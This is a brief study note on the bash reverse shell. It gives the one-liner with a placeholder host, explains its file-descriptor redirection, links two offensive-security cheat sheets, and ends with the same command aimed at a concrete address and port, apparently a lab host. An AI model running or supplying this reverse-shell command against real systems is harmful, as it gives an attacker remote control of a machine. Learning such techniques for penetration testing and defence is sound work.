# Reverse shell

bash -i >& /dev/tcp/ip_addr/port 0>&1

- -i interactive shell

>& file ~ >file 2>&1

&x : indicate that x is a file discriptors

0 : stdin

1 : stdout

2 : stderr

[http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

https://github.com/swisskyrepo/PayloadsAllTheThings/

bash -i >& /dev/tcp/10.9.173.10/1338 0>&1
